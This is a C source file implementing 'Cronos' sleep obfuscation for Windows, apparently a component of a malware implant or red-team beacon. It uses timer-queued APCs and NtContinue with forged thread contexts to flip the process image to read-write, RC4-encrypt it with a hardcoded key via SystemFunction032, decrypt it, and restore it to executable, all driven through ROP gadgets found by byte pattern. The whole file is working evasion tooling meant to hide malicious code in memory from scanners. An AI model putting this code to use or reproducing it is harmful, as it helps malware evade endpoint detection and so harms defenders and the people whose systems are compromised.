#include "Cronos.h"
#include "Utils.h"

void CronosSleep(int sleepTime) {
	HANDLE hProtectionRWTimer;
	HANDLE hProtectionRWXTimer;
	HANDLE hEncryptionTimer;
	HANDLE hDecryptionTimer;
	HANDLE hDummyThreadTimer;

	LARGE_INTEGER protectionRWDueTime;
	LARGE_INTEGER protectionRWXDueTime;
	LARGE_INTEGER encryptionDueTime;
	LARGE_INTEGER decryptionDueTime;
	LARGE_INTEGER dummyDueTime;

	PVOID rcxGadget;
    PVOID rdxGadget;
    PVOID shadowFixerGadget;

	CONTEXT ctxDummyThread = { 0 };
    CONTEXT ctxProtectionRW = { 0 };
    CONTEXT ctxProtectionRWX = { 0 };
    CONTEXT ctxEncryption = { 0 };
    CONTEXT ctxDecryption = { 0 };

	PVOID NtContinue = NULL;
	tSystemFunction032 SystemFunction032 = NULL;

	PVOID ImageBase = NULL;
	DWORD ImageSize = 0;
	DWORD oldProtect = 0;
	CRYPT_BUFFER Image = { 0 };
	DATA_KEY Key = { 0 };
	CHAR keyBuffer[16] = { 0x31, 0x31, 0x31, 0x31, 0x31, 0x31, 0x31, 0x31, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18 };

	// Load systemfunction032.
	HMODULE hAdvapi32 = LoadLibraryA("Advapi32.dll");
	HMODULE hNtdll = GetModuleHandleA("Ntdll.dll");

	if (hAdvapi32 == 0 || hNtdll == 0)
		return;

	SystemFunction032 = (tSystemFunction032) GetProcAddress(hAdvapi32, "SystemFunction032");
	NtContinue = GetProcAddress(hNtdll, "NtContinue");

	// Getting the image base.
	ImageBase = GetModuleHandleA(NULL);
	ImageSize = ((PIMAGE_NT_HEADERS)((DWORD_PTR)ImageBase + ((PIMAGE_DOS_HEADER)ImageBase)->e_lfanew))->OptionalHeader.SizeOfImage;

	// Initializing the image and key for SystemFunction032.
	Key.Buffer = keyBuffer;
	Key.Length = Key.MaximumLength = 16;

	Image.Buffer = ImageBase;
	Image.Length = Image.MaximumLength = ImageSize;

	// Creating the waitable timers.
	hProtectionRWTimer = CreateWaitableTimerW(NULL, TRUE, L"ProtectionRWTimer");
	hProtectionRWXTimer = CreateWaitableTimerW(NULL, TRUE, L"ProtectionRWXTimer");
	hEncryptionTimer = CreateWaitableTimerW(NULL, TRUE, L"EncryptionTimer");
	hDecryptionTimer = CreateWaitableTimerW(NULL, TRUE, L"DecryptionTimer");
	hDummyThreadTimer = CreateWaitableTimerW(NULL, TRUE, L"DummyTimer");

	if (hProtectionRWTimer == 0 || hProtectionRWXTimer == 0 ||
		hEncryptionTimer == 0 || hDecryptionTimer == 0 || hDummyThreadTimer == 0) {

		printf("[ - ] Failed to create waitable timers: %d", GetLastError());
		FreeLibrary(hAdvapi32);
		return;
	}

	InitializeTimerMs(&dummyDueTime, 0);

	// Capture apc context.
	if (!SetWaitableTimer(hDummyThreadTimer, &dummyDueTime, 0, (PTIMERAPCROUTINE) RtlCaptureContext, &ctxDummyThread, FALSE)) {
		printf("[ - ] Failed to capture context: %d", GetLastError());
		goto CleanUp;
	}
	SleepEx(INFINITE, TRUE);

	// Creating the contexts.
	memcpy(&ctxProtectionRW,  &ctxDummyThread, sizeof(CONTEXT));
    memcpy(&ctxEncryption,    &ctxDummyThread, sizeof(CONTEXT));
    memcpy(&ctxDecryption,    &ctxDummyThread, sizeof(CONTEXT));
    memcpy(&ctxProtectionRWX, &ctxDummyThread, sizeof(CONTEXT));
	
	// VirtualProtect( ImageBase, ImageSize, PAGE_READWRITE, &OldProtect );
	ctxProtectionRW.Rsp -= (8 + 0x150);
	ctxProtectionRW.Rip = (DWORD_PTR) VirtualProtect;
	ctxProtectionRW.Rcx = (DWORD_PTR) ImageBase;
	ctxProtectionRW.Rdx = ImageSize;
	ctxProtectionRW.R8  = PAGE_READWRITE;
	ctxProtectionRW.R9  = (DWORD_PTR) &oldProtect;

	ctxEncryption.Rsp -= (8 + 0xF0);
	ctxEncryption.Rip = (DWORD_PTR) SystemFunction032;
	ctxEncryption.Rcx = (DWORD_PTR) &Image;
	ctxEncryption.Rdx = (DWORD_PTR) &Key;

    ctxDecryption.Rsp   -= (8 + 0x90);
	ctxDecryption.Rip   = (DWORD_PTR) SystemFunction032;
	ctxDecryption.Rcx   = (DWORD_PTR) &Image;
	ctxDecryption.Rdx   = (DWORD_PTR) &Key;

	ctxProtectionRWX.Rsp -= (8 + 0x30);
	ctxProtectionRWX.Rip = (DWORD_PTR) VirtualProtect;
	ctxProtectionRWX.Rcx = (DWORD_PTR) ImageBase;
	ctxProtectionRWX.Rdx = ImageSize;
	ctxProtectionRWX.R8  = PAGE_EXECUTE_READWRITE;
	ctxProtectionRWX.R9  = (DWORD_PTR) &oldProtect;

    InitializeTimerMs(&protectionRWDueTime,   0 );
    InitializeTimerMs(&encryptionDueTime,     1 );
    InitializeTimerMs(&decryptionDueTime,     sleepTime-1 );
    InitializeTimerMs(&protectionRWXDueTime,  sleepTime);

	// Getting the gadgets for the sleepex rop.
	rcxGadget = findGadget((PBYTE) "\x59\xC3", "xx");
    rdxGadget = findGadget((PBYTE) "\x5A\xC3", "xx");
    shadowFixerGadget = findGadget((PBYTE) "\x48\x83\xC4\x20\x5F\xC3", "xxxxxx");

    if(rcxGadget == 0 || rdxGadget == 0 || shadowFixerGadget == 0) {
        printf("[!] Error finding gadget\n");
        goto CleanUp;
    }

	// Setting the timers.
	if (!SetWaitableTimer(hDecryptionTimer, &decryptionDueTime, 0, NtContinue, &ctxDecryption, FALSE) ||
		!SetWaitableTimer(hProtectionRWXTimer, &protectionRWXDueTime, 0, NtContinue, &ctxProtectionRWX, FALSE) ||
		!SetWaitableTimer(hProtectionRWTimer, &protectionRWDueTime, 0, NtContinue, &ctxProtectionRW, FALSE) ||
		!SetWaitableTimer(hEncryptionTimer, &encryptionDueTime, 0, NtContinue, &ctxEncryption, FALSE))
	{
		printf("[ - ] Failed to SetWaitableTimer: %d", GetLastError());
		goto CleanUp;
	}

	// Executing the code.
	QuadSleep(rcxGadget, rdxGadget, shadowFixerGadget, (PVOID) SleepEx);

CleanUp:
	CloseHandle(hDummyThreadTimer);
	CloseHandle(hDecryptionTimer);
	CloseHandle(hProtectionRWXTimer);
	CloseHandle(hProtectionRWTimer);
	CloseHandle(hEncryptionTimer);
	FreeLibrary(hAdvapi32);
}